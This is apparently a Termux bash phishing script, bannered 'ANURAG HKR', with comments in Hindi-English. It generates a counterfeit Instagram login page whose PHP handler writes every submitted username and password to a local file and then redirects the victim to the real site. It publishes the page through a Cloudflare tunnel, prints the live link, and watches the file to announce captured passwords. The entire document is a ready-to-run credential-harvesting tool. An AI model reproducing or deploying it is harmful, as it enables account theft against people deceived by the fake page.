#!/bin/bash

# --- 1. SUPER CLEANUP (Sab kuch saaf karo) ---
clear
echo -e "\033[1;33m[*] Cleaning System...\033[0m"
pkill -f php
pkill -f cloudflared
rm -rf auth/ cloud.log php_error.log
# Purana cloudflared delete kar rahe hain taki fresh download ho
if [ -f "cloudflared" ]; then
    rm cloudflared
fi
mkdir -p auth
touch usernames.txt

# --- 2. INSTALL DEPENDENCIES (Jabar-dasti) ---
echo -e "\033[1;33m[*] Checking Drivers...\033[0m"
pkg install php wget curl proot resolv-conf -y > /dev/null 2>&1

# --- 3. CREATE HTML (Wahi Design) ---
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>
<style>
body{background:#000;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.card{width:350px;text-align:center;padding:20px;}
input{width:90%;padding:10px;margin:5px;background:#121212;border:1px solid #333;color:#fff;border-radius:5px;}
button{width:95%;padding:10px;background:#0095f6;border:none;color:#fff;font-weight:bold;border-radius:5px;margin-top:10px;}
.img-logo {width: 180px; margin-bottom: 20px;}
</style>
</head>
<body>
<div class="card">
    <img class="img-logo" src="https://i.imgur.com/zqPwkZl.png" alt="Instagram">
    <form action="login.php" method="POST">
        <input type="text" name="username" placeholder="Username, email or mobile" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log in</button>
    </form>
</div>
</body>
</html>
EOF

# --- 4. PHP BACKEND ---
cat > auth/login.php <<EOF
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$user = \$_POST['username'];
\$pass = \$_POST['password'];
file_put_contents("../usernames.txt", "User: \$user | Pass: \$pass\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 5. INTERFACE ---
clear
G='\033[1;32m'
Y='\033[1;33m'
R='\033[1;31m'
C='\033[1;36m'
RESET='\033[0m'

echo -e "${G}=======================================${RESET}"
echo -e "${Y}   ANURAG HKR - DEBUG MODE (FIX)       ${RESET}"
echo -e "${G}=======================================${RESET}"
echo ""
echo -e "${C}[1] Localhost (Test)${RESET}"
echo -e "${C}[2] Cloudflare (Live Link)${RESET}"
echo ""
echo -ne "${Y}Select Option: ${RESET}"
read option

# --- 6. LOGIC ---
if [[ $option == "1" ]]; then
    echo -e "${Y}[*] Starting PHP Server...${RESET}"
    
    # Error dekhne ke liye '/dev/null' hata diya hai
    # 'termux-chroot' use kar rahe hain
    termux-chroot php -S 127.0.0.1:8080 -t auth > php_error.log 2>&1 &
    PID=$!
    sleep 3
    
    # Check agar server zinda hai
    if ps -p $PID > /dev/null; then
        echo -e "${G}[✔] SERVER IS RUNNING!${RESET}"
        echo -e "${C}Link: http://127.0.0.1:8080${RESET}"
        echo -e "${Y}(Is link ko Chrome me open karein)${RESET}"
    else
        echo -e "${R}[!] ERROR: Server start nahi hua.${RESET}"
        echo -e "${Y}Reason (Error Log):${RESET}"
        cat php_error.log
        exit
    fi

elif [[ $option == "2" ]]; then
    echo -e "${Y}[*] Downloading Cloudflare (Fresh)...${RESET}"
    
    # Fresh Download
    wget -q --show-progress --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
    chmod +x cloudflared
    
    if [ ! -f "cloudflared" ]; then
        echo -e "${R}[!] Download Failed! Internet check karein.${RESET}"
        exit
    fi

    echo -e "${Y}[*] Starting Services...${RESET}"
    
    # PHP Start
    termux-chroot php -S 127.0.0.1:8080 -t auth > /dev/null 2>&1 &
    sleep 2
    
    # Cloudflare Start (Verbose Mode)
    echo -e "${Y}[*] Generating Link (Wait 10s)...${RESET}"
    termux-chroot ./cloudflared tunnel -url http://127.0.0.1:8080 --logfile cloud.log > /dev/null 2>&1 &
    
    # Wait Loop with Progress
    for i in {1..10}; do
        echo -ne "."
        sleep 2
    done
    
    echo ""
    # Link nikalo
    LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
    
    if [[ ! -z "$LINK" ]]; then
        echo -e "${G}========================================${RESET}"
        echo -e "${Y} LIVE URL: ${LINK} ${RESET}"
        echo -e "${G}========================================${RESET}"
    else
        echo -e "${R}[!] Link Generate Nahi Hua!${RESET}"
        echo -e "${Y}Debug Info (Cloudflare Log):${RESET}"
        cat cloud.log
        exit
    fi
fi

# --- 7. DATA MONITOR ---
echo ""
echo -e "${C}[*] Waiting for Passwords...${RESET}"
while true; do
    if [ -f usernames.txt ]; then
        tail -n 0 -f usernames.txt | while read line; do
            echo -e "${R}[!] CAPTURED: ${G}$line${RESET}"
            echo -e "\a"
        done
    fi
done
